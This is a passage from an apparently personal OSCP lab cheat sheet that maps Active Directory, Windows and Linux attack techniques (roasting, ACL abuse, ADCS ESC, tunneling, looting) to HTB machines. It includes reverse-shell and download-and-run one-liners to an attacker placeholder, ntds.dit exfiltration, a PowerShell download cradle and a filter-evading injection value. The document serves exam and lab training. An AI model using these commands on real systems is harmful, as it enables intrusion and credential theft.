**When:** you have a user list with no credentials (AS-REP) or any valid domain account (Kerberoast).

**Prerequisites:** AS-REP needs `UF_DONT_REQUIRE_PREAUTH`; Kerberoast needs an SPN on an account you want; targeted roasting needs write access over the victim and a synced clock.

**Commands:**

```bash
GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -save -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p '<PASS>'
sudo ntpdate <DOMAIN>            # targeted roast fails without sync
```

**Seen on:** [Forest](/notes/oscp-labs/ad/) (AD), [Sauna](/notes/oscp-labs/ad/) (AD), [Active](/notes/oscp-labs/ad/) (AD), [Administrator](/notes/oscp-labs/ad/) (AD)

**Notes:** [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) · **Pitfall:** cracking a normal user when the SPN sits on a privileged account — a single roast of `Administrator` was the whole box (Active).

### ACL and GPO abuse to DCSync

**When:** BloodHound or `dacledit` shows a write primitive (GenericAll, GenericWrite, WriteDacl, WriteOwner, WriteMembers) over a user, group or the domain object.

**Prerequisites:** the ACL actually applies to you; some chains are two-step (own the object, then grant yourself rights); a revert script may undo changes.

**Commands:**

```bash
net rpc password "<TARGET>" "<NEWPASS>" -U "<DOMAIN>"/"<USER>"%'<PASS>' -S <IP>
owneredit.py -action write -new-owner <USER> -target <GROUP> <DOMAIN>/<USER>:<PASS> -dc-ip <IP>
dacledit.py -action write -rights WriteMembers -principal <USER> -target <GROUP> <DOMAIN>/<USER>:<PASS>
certipy shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account <TARGET>
New-GPO -Name x; New-GPLink -Name x -Target "DC=<DOMAIN>,DC=local"
gpupdate /force
```

**Seen on:** [Forest](/notes/oscp-labs/ad/) (AD), [Blackfield](/notes/oscp-labs/ad/) (AD), [Certified](/notes/oscp-labs/ad/) (AD), [TheFrizz](/notes/oscp-labs/ad/) (AD)

**Notes:** [ACL abuse](/notes/active-directory/internal-enumeration-and-lateral-movement/) · [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) · **Pitfall:** granting the right but not verifying it immediately before the dump — Forest's `revert.ps1` strips ACLs every 60 seconds.

### ADCS ESC chains

**When:** a certificate authority is exposed and `certipy find` reports a vulnerable template or CA setting.

**Prerequisites:** ESC1 needs enrollee-supplies-subject plus a client-auth EKU plus enrolment rights; ESC4 needs write on the template; ESC9 needs a UPN swap. Findings are permission-dependent — enumerate as each new user.

**Commands:**

```bash
certipy find -vulnerable -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <IP> -stdout
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template UserAuthentication -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -domain <DOMAIN>
certipy template -u <USER> -hashes <HASH> -template <TEMPLATE> -save-old     # ESC4, restore after
certipy account update -user <USER> -upn Administrator                       # ESC9, UPN without @domain
```

**Seen on:** [Escape](/notes/oscp-labs/ad/) (AD), [EscapeTwo](/notes/oscp-labs/ad/) (AD), [Certified](/notes/oscp-labs/ad/) (AD)

**Notes:** [ADCS attacks](/notes/active-directory/adcs-attacks/) · **Pitfall:** concluding "no vulnerable templates" after one `find` — ESC4 only appeared when run as `ca_svc`, a Cert Publishers member.

### Backup and Server Operators

**When:** you land `SeBackupPrivilege`/`SeRestorePrivilege`, or membership of Backup/Server Operators, without being a local admin.

**Prerequisites:** the privilege is enabled; for DiskShadow, a CRLF script and a writable working directory; on a DC, the SAM `Administrator` is the domain Administrator.

**Commands:**

```bash
sc.exe config VSS binpath= "C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd <ATTACKER> <LPORT>"
sc.exe start VSS
reg save hklm\sam sam; reg save hklm\system system
secretsdump.py -sam sam -system system LOCAL
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\<ATTACKER>\share\ntds.dit
```

**Seen on:** [Return](/notes/oscp-labs/ad/) (AD), [Blackfield](/notes/oscp-labs/ad/) (AD), [Cicada](/notes/oscp-labs/ad/) (AD)

**Notes:** [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) · [Excessive rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · **Pitfall:** `sc start` returns 1053 and the service manager kills your child after ~30 s — put the payload on the service's own command line.

### Coerced authentication to Net-NTLMv2

**When:** a service authenticates outbound to a host you name — MSSQL, a web file-read, an LDAP client, a document renderer.

**Prerequisites:** the responder/listener is reachable from the target and the UNC host matches the share name; capturing is not relaying (signing may be on).

**Commands:**

```bash
EXEC xp_dirtree '\\<ATTACKER>\share', 1, 1
8; EXEC master..xp_dirtree "\\<ATTACKER>\test"; --
responder -I tun0
curl -d 'ip=<ATTACKER>' http://<IP>/settings.php    # LDAP simple bind, cleartext
nc -lvnp 389
```

**Seen on:** [Querier](/notes/oscp-labs/windows/) (Windows), [Giddy](/notes/oscp-labs/windows/) (Windows), [Escape](/notes/oscp-labs/ad/) (AD), [Return](/notes/oscp-labs/ad/) (AD)

**Notes:** [NTLM relay](/notes/active-directory/ntlm-relay/) · [MSSQL](/notes/protocols-and-services/mssql/) · **Pitfall:** trying to relay when SMB signing is enforced — capture to crack, and an LDAP bind gives cleartext rather than a challenge.

### MSSQL as an AD pivot

**When:** 1433 is open and you hold a SQL or domain account; MSSQL is both an execution channel and a privilege boundary.

**Prerequisites:** correct auth backend (SQL vs Windows vs domain), and the permission that matters — `xp_cmdshell` may be blocked while `xp_dirtree` is not.

**Commands:**

```bash
mssqlclient.py <DOMAIN>/<USER>:<PASS>@<IP> -windows-auth
netexec mssql <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth
enable_xp_cmdshell
xp_cmdshell whoami
ticketer.py -nthash <HASH> -domain-sid <SID> -spn MSSQLSvc/<DC>.<DOMAIN>:1433 -groups 1105 Administrator
KRB5CCNAME=x.ccache mssqlclient.py -no-pass -k <DC>.<DOMAIN>
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS C;
```

**Seen on:** [Escape](/notes/oscp-labs/ad/) (AD), [EscapeTwo](/notes/oscp-labs/ad/) (AD), [Querier](/notes/oscp-labs/windows/) (Windows), [Signed](/notes/oscp-labs/ad/) (AD)

**Notes:** [MSSQL](/notes/protocols-and-services/mssql/) · **Pitfall:** writing off an account after one failed login — `scott` is SQL-only and `mssqlsvc` is domain-only; test both backends.

## Pivoting, tunneling & loot

### Localhost-only services and tunnels

**When:** `ss -tnl` / `netstat` shows a service bound to `127.0.0.1`, or a vhost is defined as `<VirtualHost localhost:80>`.

**Prerequisites:** a shell that permits port forwarding, or the ability to run a tunneler on the target; the service is not reachable from your host directly.

**Commands:**

```bash
ss -tnl
ssh -L 19999:localhost:19999 <USER>@<IP>
ssh -D 8081 <USER>@<IP> && proxychains vncviewer 127.0.0.1:5901 -passwd secret
chisel server -p 8000 --reverse                                  # attacker
.\c.exe client <ATTACKER>:8000 R:8888:localhost:8888             # target
```

**Seen on:** [Poison](/notes/oscp-labs/linux/) (Linux), [Editor](/notes/oscp-labs/linux/) (Linux), [Enigma](/notes/oscp-labs/linux/) (Linux), [Buff](/notes/oscp-labs/windows/) (Windows)

**Notes:** [Pivoting](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) · **Pitfall:** trying to reach a loopback vhost through the external IP — tunnel first, then point the hostname at 127.0.0.1 in `/etc/hosts`.

### Payload staging and delivery

**When:** the exploit works locally but the target cannot download, decode or execute your one-liner.

**Prerequisites:** an outbound path (HTTP/SMB) and an execution location that AV/AppLocker permits; know the target shell (`cmd`, PowerShell, sh).

**Commands:**

```bash
smbserver.py share . -smb2support -username <USER> -password '<PASS>'
net use \\<ATTACKER>\share /u:<USER> '<PASS>'
curl http://<ATTACKER>/rev.sh -o /tmp/rev.sh && bash /tmp/rev.sh   # avoid pipe mangling (Cozyhosting)
copy nc64.exe C:\Windows\System32\spool\drivers\color\             # AppLocker-allowed path (Sniper)
```

**Seen on:** [Buff](/notes/oscp-labs/windows/) (Windows), [Sniper](/notes/oscp-labs/windows/) (Windows), [Giddy](/notes/oscp-labs/windows/) (Windows), [Flight](/notes/oscp-labs/ad/) (AD)

**Notes:** [File transfers](/notes/utilities-scripts-and-payloads/file-transfers/) · [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) · **Pitfall:** assuming a PowerShell one-liner or pipe survives — stage a file and execute it from a directory the policy allows.

### Loot: hidden data, dumps and stored credentials

**When:** you have a shell and need the flag or a better credential; the host usually already stores one.

**Prerequisites:** the ability to read the user's profile or a privileged hive; for LAPS, read rights on `ms-mcs-admpwd`.

**Commands:**

```bash
dir /R; more < hm.txt:root.txt                       # ADS (Jeeves)
gci -force                                           # hidden files (Bounty)
cmdkey /list                                         # stored creds (Access)
runas /user:<DOMAIN>\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://<ATTACKER>/shell.ps1')"
Get-ChildItem 'C:\$RECYCLE.BIN' -Recurse -Force      # $R = content (TheFrizz)
Get-ADComputer <DC> -property 'ms-mcs-admpwd'        # LAPS (Timelapse)
```

**Seen on:** [Jeeves](/notes/oscp-labs/windows/) (Windows), [Access](/notes/oscp-labs/windows/) (Windows), [TheFrizz](/notes/oscp-labs/ad/) (AD), [Timelapse](/notes/oscp-labs/ad/) (AD)

**Notes:** [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) · **Pitfall:** stopping at `ls` — `-Force`, `dir /R`, the Recycle Bin, browser memory and DPAPI blobs hold the credential that ends the box.

## Pitfalls & time wasters

### Recognise the decoy, the fake version and the revert timer

**When:** you can log in but cannot write, a scanner reports a version the changelog contradicts, or a change keeps disappearing.

**Prerequisites:** a second source of truth — changelog, file mtime, scheduled task list — before investing more time in the path.

**Commands:**

```bash
ls -la /scripts        # run twice: mtime delta reveals an unreadable cron (Bashed)
schtasks /query /tn restore /v        # a revert loop explains vanishing ACLs (Forest)
cat readme.txt         # changelog can contradict the scanner's version (Tartarsauce)
```

**Seen on:** [Tartarsauce](/notes/oscp-labs/linux/) (Linux), [Bashed](/notes/oscp-labs/linux/) (Linux), [Forest](/notes/oscp-labs/ad/) (AD), [Broker](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) · **Pitfall:** sinking time into an app you can log into but cannot write to (Monstra on Tartarsauce) or an admin UI that is a dead end (Broker's 8161/80).

### Verify execution and re-encode

**When:** the exploit answers with a traceback, "Something went wrong" or "no available actions", or a payload that works locally is mangled by the target's filter or interpreter.

**Prerequisites:** an out-of-band channel (listener, `tcpdump`, file timestamp) to prove the side effect, and knowledge of which interpreter consumes the string.

**Commands:**

```bash
tcpdump -ni tun0 icmp
nc -lnvp <LPORT>
ls -la <PATH>                                                      # did the file write land?
curl http://<ATTACKER>/rev.sh -o /tmp/rev.sh && bash /tmp/rev.sh   # pipes become filenames
username=x;ping${IFS}-c${IFS}1${IFS}<IP>;#                          # spaces in a filtered field
```

**Seen on:** [Silentium](/notes/oscp-labs/linux/) (Linux), [Editorial](/notes/oscp-labs/linux/) (Linux), [Monitored](/notes/oscp-labs/linux/) (Linux), [Cozyhosting](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Shells and payloads](/notes/utilities-scripts-and-payloads/shells-and-payloads/) · **Pitfall:** trusting the response body or a copied one-liner — a clone that throws after cloning, a write that answers "Something went wrong", and a `getprofile.sh` that reports `mv: cannot stat` all executed; re-encode and test in the target's own shell.

## Pattern-to-machine matrix

Grouped by the phase where the box turns, not one row per machine. Each group names the patterns that decide most of its boxes; open the machine page for the exact path.

| Machine group | Representative machines | Defining patterns |
| ------------- | ----------------------- | ----------------- |
| Linux — web app to credential reuse | Enigma, Keeper, Devvortex, BoardLight | Vhost discovery when the IP root is a decoy · Exposed repositories, backups and source archives · Default, guessable and reused credentials · Land code in an executable location |
| Linux — service-heavy and internal | Solidstate, Sunday, Broker, UnderPass | Full-port and UDP reachability · Credentials mined from non-web services · Version fingerprint to CVE |
| Linux — privesc decides the box | Nibbles, Bashed, Networked, Pandora | Root-run jobs you can write or influence · sudo: GTFOBins and script logic · SUID, capabilities and PATH hijacking |
| Windows — web to shell | Markup, Bounty, Buff, Jerry | Land code in an executable location · A privileged process runs an artifact you control · Payload staging and delivery |
| Windows — credentials and tokens | Netmon, Access, Heist, Mailing | Credentials mined from non-web services · Loot: hidden data, dumps and stored credentials · SeImpersonate and the potato family |
| AD — unauthenticated entry | Forest, Sauna, Active, Cicada | Unauthenticated user enumeration · Kerberos roasting · Credentials mined from non-web services |
| AD — assumed breach | Certified, EscapeTwo, Puppy, Signed | ACL and GPO abuse to DCSync · MSSQL as an AD pivot · Coerced authentication to Net-NTLMv2 |
| AD — certificate and backup paths | Escape, EscapeTwo, Certified, Blackfield | ADCS ESC chains · Backup and Server Operators · ACL and GPO abuse to DCSync |
| Cross-cutting: pivot and loot | Poison, Editor, Buff, Jeeves | Localhost-only services and tunnels · Payload staging and delivery · Loot: hidden data, dumps and stored credentials |

## Where these patterns come from

Written while working the HTB portion of
[Lainkusanagi's OSCP-like list](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/),
then generalised: each row names the boxes it fired on, and every command still
needs its placeholders replaced. The [machine index](/notes/oscp-labs/machine-index/)
routes you to a box; this page routes you to a technique, which is what carries
into a practice CTF or an exam set you have not seen.

The library is hand-written and **not regenerated when the list changes**, so a
box can appear on the sheet before it appears here. Proving Grounds coverage will
be added if I get access to the platform or plan an OSCP attempt.